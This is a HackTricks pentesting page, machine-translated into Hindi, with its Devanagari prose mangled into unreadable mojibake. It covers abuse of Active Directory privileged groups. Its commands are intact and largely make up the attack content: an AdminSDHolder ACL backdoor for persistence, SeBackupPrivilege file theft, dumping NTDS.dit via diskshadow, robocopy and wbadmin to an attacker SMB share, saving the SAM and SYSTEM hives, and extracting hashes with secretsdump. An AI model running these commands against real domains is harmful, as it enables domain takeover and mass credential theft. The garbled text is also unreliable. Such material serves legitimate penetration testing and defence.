# рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рд╕рдореВрд╣

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЬреНрдЮрд╛рдд рд╕рдореВрд╣

* **рдкреНрд░рд╢рд╛рд╕рдХ**
* **рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ**
* **рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ**

рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХреЗ рджреМрд░рд╛рди рдПрдХрд╛рдзрд┐рдХ рд╣рдорд▓рд╛ рд╡реЗрдХреНрдЯрд░ рдЪреЗрди рдХрд░рддреЗ рд╕рдордп рдЕрдиреНрдп рдЦрд╛рддрд╛ рд╕рджрд╕реНрдпрддрд╛ рдФрд░ рдкрд╣реБрдБрдЪ рдЯреЛрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рднреА рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

## рдЦрд╛рддрд╛ рдСрдкрд░реЗрдЯрд░реНрд╕ <a href="#account-operators" id="account-operators"></a>

* рдбреЛрдореЗрди рдкрд░ рдЧреИрд░ рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддреЗ рдФрд░ рд╕рдореВрд╣ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ
* DC рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ

рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдп** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
рдиреЛрдЯ рдХрд░реЗрдВ рд╕реНрдкреЙрдЯрд▓реЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рджрд╕реНрдпрддрд╛:

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдо рдЕрднреА рднреА рдирдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ:

![](../../.gitbook/assets/a2.png)

рд╕рд╛рде рд╣реА, DC01 рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

![](../../.gitbook/assets/a3.png)

## AdminSDHolder рд╕рдореВрд╣

**AdminSDHolder** рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рдПрдХреНрд╕реЗрд╕ рдХрдВрдЯреНрд░реЛрд▓ рд╕реВрдЪреА (ACL) рдХрд╛ рдЙрдкрдпреЛрдЧ Active Directory рдореЗрдВ рд╕рднреА "рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕рдореВрд╣реЛрдВ" рдХреЛ **рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХреА **рдкреНрд░рддрд┐рд▓рд┐рдкрд┐** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕рдореВрд╣реЛрдВ рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рд╕рдореВрд╣ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ, рдкреНрд░рд╢рд╛рд╕рдХ, рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдФрд░ рд╕реНрдХреАрдорд╛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХред\
рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдЗрд╕ рд╕рдореВрд╣ рдХреА ACL рд╕рднреА "рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕рдореВрд╣реЛрдВ" рдХреЗ рдЕрдВрджрд░ рдХреЙрдкреА рдХреА рдЬрд╛рддреА рд╣реИред рдЗрд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдпрд╣ рд╣реИ рдХрд┐ рдЗрди рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рдореВрд╣реЛрдВ рдореЗрдВ рдЗрдЪреНрдЫрд┐рдд рдпрд╛ рдЕрдХрд╕реНрдорд╛рдд рдмрджрд▓рд╛рд╡ рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╕рдореВрд╣ **AdminSDHolder** рдХреА ACL рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреВрд░реНрдг рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрддрд╛ рд╣реИ, рддреЛ рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рд╕рднреА рд╕рдореВрд╣реЛрдВ рдкрд░ рдкреВрд░реНрдг рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдВрдЧреА (рдПрдХ рдШрдВрдЯреЗ рдореЗрдВ)ред\
рдФрд░ рдпрджрд┐ рдХреЛрдИ рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХреЛрдВ рд╕реЗ рд╣рдЯрд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рдПрдХ рдШрдВрдЯреЗ рдпрд╛ рдЙрд╕рд╕реЗ рдХрдо рд╕рдордп рдореЗрдВ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдореВрд╣ рдореЗрдВ рд╡рд╛рдкрд╕ рдЖ рдЬрд╛рдПрдЧрд╛ред

рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдпреЛрдВ** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
**AdminSDHolder** рд╕рдореВрд╣ рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛрдбрд╝реЗрдВ:
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **Domain Admins** рд╕рдореВрд╣ рдореЗрдВ рд╣реИ:
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
рдпрджрд┐ рдЖрдк рдПрдХ рдШрдВрдЯреЗ рддрдХ рдкреНрд░рддреАрдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдПрдХ PS рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рддрддреНрдХрд╛рд▓ рдкреБрдирд░реНрд╕реНрдерд╛рдкрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА ired.team рдореЗрдВред**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **AD Recycle Bin**

рдпрд╣ рд╕рдореВрд╣ рдЖрдкрдХреЛ рд╣рдЯрд╛рдП рдЧрдП AD рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╡рд╣рд╛рдВ рдХреБрдЫ рд░реЛрдЪрдХ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓ рд╕рдХрддреА рд╣реИ:
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдПрдХреНрд╕реЗрд╕

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣рдо рд╡рд░реНрддрдорд╛рди рд╕рджрд╕реНрдпрддрд╛ рдХреЗ рд╕рд╛рде рдбреАрд╕реА рдкрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

![](../../.gitbook/assets/a4.png)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `рд╕рд░реНрд╡рд░ рдСрдкрд░реЗрдЯрд░реНрд╕` рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ:

![](../../.gitbook/assets/a5.png)

рдХрд╣рд╛рдиреА рдмрджрд▓ рдЬрд╛рддреА рд╣реИ:

![](../../.gitbook/assets/a6.png)

### Privesc <a href="#backup-operators" id="backup-operators"></a>

рд╕реЗрд╡рд╛ рдкрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) рдпрд╛ `sc`, рд╕рд┐рд╕рдЗрдВрдЯрд░рдирд▓реНрд╕ рд╕реЗ, рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

[ALLOW] BUILTIN\Server Operators
All
```
рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ Server Operators рд╕рдореВрд╣ рдореЗрдВ [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) рдПрдХреНрд╕реЗрд╕ рд░рд╛рдЗрдЯ рд╣реИ, рдЬреЛ рд╣рдореЗрдВ рдЗрд╕ рд╕реЗрд╡рд╛ рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред\
рдЖрдк рдЗрд╕ рд╕реЗрд╡рд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рд╕реЗрд╡рд╛ рдХреЛ рдЕрднрд┐рдорд╛рдиреА рдЖрджреЗрд╢реЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдкреНрд░рднрд╛рд╡реА рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## Backup Operators <a href="#backup-operators" id="backup-operators"></a>

`Server Operators` рд╕рджрд╕реНрдпрддрд╛ рдХреА рддрд░рд╣, рд╣рдо `Backup Operators` рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдиреЗ рдкрд░ **`DC01` рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рд▓рд┐рдП рдЗрд╕ рд╕рдореВрд╣ рдЕрдкрдиреЗ рд╕рджрд╕реНрдпреЛрдВ рдХреЛ [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) рдФрд░ [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5) рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред **SeBackupPrivilege** рд╣рдореЗрдВ рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдЯреНрд░рд╛рд╡рд░реНрд╕ рдХрд░рдиреЗ рдФрд░ рдлрд╝реЛрд▓реНрдбрд░ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рд╣рдореЗрдВ рдХрд┐рд╕реА рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗрдЧреА, рдпрджрд┐ рдХреБрдЫ рдФрд░ рдЖрдкрдХреЛ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗ рд░рд╣рд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЭрдВрдбрд╛ [**FILE_FLAG_BACKUP_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рд▓рд┐рдП, рд╡рд┐рд╢реЗрд╖ рдЙрдкрдХрд░рдгреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЖрдк [**рдпреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ**](https://github.com/giuliano108/SeBackupPrivilege) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдп** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **рд╕реНрдерд╛рдиреАрдп рд╣рдорд▓рд╛**
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### AD рд╣рдорд▓рд╛

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рд╕реАрдзреЗ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:

![](../../.gitbook/assets/a7.png)

рдЖрдк рдЗрд╕ рдкрд╣реБрдВрдЪ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдбреЗрдЯрд╛рдмреЗрд╕ **`NTDS.dit`** рдХреЛ рдЪреЛрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдбреЛрдореЗрди рдореЗрдВ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рд╕рднреА **NTLM рд╣реИрд╢** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

#### NTDS.dit рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП diskshadow.exe рдХрд╛ рдЙрдкрдпреЛрдЧ

[**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **`C` рдбреНрд░рд╛рдЗрд╡** рдФрд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `F` рдбреНрд░рд╛рдЗрд╡ рдореЗрдВ **рд╢реИрдбреЛ рдХреЙрдкреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдлрд┐рд░, рдЖрдк рдЗрд╕ рд╢реИрдбреЛ рдХреЙрдкреА рд╕реЗ `NTDS.dit` рдлрд╝рд╛рдЗрд▓ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдореЗрдВ рдирд╣реАрдВ рд╣реЛрдЧреА:
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
рдЬреИрд╕рд╛ рдХрд┐ рд╕реНрдерд╛рдиреАрдп рд╣рдорд▓реЗ рдореЗрдВ, рдЕрдм рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдлрд╝рд╛рдЗрд▓ **`NTDS.dit`** рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
рдлрд╝рд╛рдЗрд▓реЗрдВ рдХреЙрдкреА рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**:**
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
рддрдм рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ **SYSTEM** рдФрд░ **SAM** рдХреЛ **рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ**:
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
рдЕрдВрдд рдореЗрдВ рдЖрдк **`NTDS.dit`** рд╕реЗ **рд╕рднреА рд╣реИрд╢** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### NTDS.dit рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП wbadmin.exe рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ

wbadmin.exe рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ diskshadow.exe рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рдмрд╣реБрдд рд╕рдорд╛рди рд╣реИ, wbadmin.exe рдЙрдкрдпреЛрдЧреАрддрд╛ рдПрдХ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдЙрдкрдпреЛрдЧреАрддрд╛ рд╣реИ рдЬреЛ Windows рдореЗрдВ рдмрдиреА рд╣реБрдИ рд╣реИ, Windows Vista/Server 2008 рд╕реЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реАред

рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдЖрдкрдХреЛ рдЕрдкрдиреА рд╣рдорд▓рд╛рд╡рд░ рдорд╢реАрди рдкрд░ smb рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП ntfs рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рд╕реЗрдЯрдЕрдк рдХрд░рдиреА рд╣реЛрдЧреАред

рдЬрдм рдЖрдк smb рд╕рд░реНрд╡рд░ рдХреЛ рд╕реЗрдЯрдЕрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдорд╛рдкреНрдд рдХрд░ рдЪреБрдХреЗ рд╣реЛрдВ, рддреЛ рдЖрдкрдХреЛ рд▓рдХреНрд╖рд┐рдд рдорд╢реАрди рдкрд░ smb рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдХреИрд╢ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА:
```
# cache the smb credential.
net use X: \\<AttackIP>\sharename /user:smbuser password

# check if working.
dir X:\
```
рдпрджрд┐ рдХреЛрдИ рддреНрд░реБрдЯрд┐ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ wbadmin.exe рдХреЛ рдЗрд╕рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```
# Start backup the system.
# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# Look at the backup version to get time.
wbadmin get versions

# Restore the version to dump ntds.dit.
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
рдпрджрд┐ рдпрд╣ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ `C:\ntds.dit` рдореЗрдВ рдбрдВрдк рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

[IPPSEC рдХреЗ рд╕рд╛рде рдбреЗрдореЛ рд╡реАрдбрд┐рдпреЛ](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)

## DnsAdmins

**DNSAdmins** рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп рдпрд╛ **DNS** рд╕рд░реНрд╡рд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░ **рд▓реЗрдЦрди рдЕрдзрд┐рдХрд╛рд░** рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **SYSTEM** рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ **рд╡рд┐рдЪрд┐рддреНрд░ DLL** рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрд╣ рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **Domain Controllers** рдХреЛ рдЕрдХреНрд╕рд░ **DNS рд╕рд░реНрд╡рд░** рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

